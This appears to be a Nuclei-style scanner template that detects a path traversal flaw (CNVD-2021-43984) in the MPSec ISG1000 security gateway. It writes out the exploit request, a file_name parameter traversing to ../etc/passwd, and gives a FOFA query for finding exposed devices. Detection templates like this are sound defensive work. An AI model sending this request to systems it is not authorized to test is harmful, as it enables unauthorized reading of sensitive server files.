id: CNVD-2021-43984

info:
  name: MPSec ISG1000 安全网关任意文件下载漏洞（CNVD-2021-43984）
  author: DhiyaneshDk
  severity: high
  description: |
    MPSec ISG1000 安全网关存在任意文件下载风险，攻击者可通过路径穿越读取服务器上的敏感文件。模板请求 `../etc/passwd` 并以明文内容和响应头特征作为命中依据。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-43984
    - https://github.com/chaitin/xray/blob/master/pocs/mpsec-isg1000-file-read.yml
  metadata:
    verified: true
    max-request: 1
    fofa-query: "迈普通信技术股份有限公司"
  tags: cnvd2021,cnvd,mpsec,maipu,lfi,isg,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "text/plain"
          - "USGSESSID="
        condition: and

      - type: status
        status:
          - 200
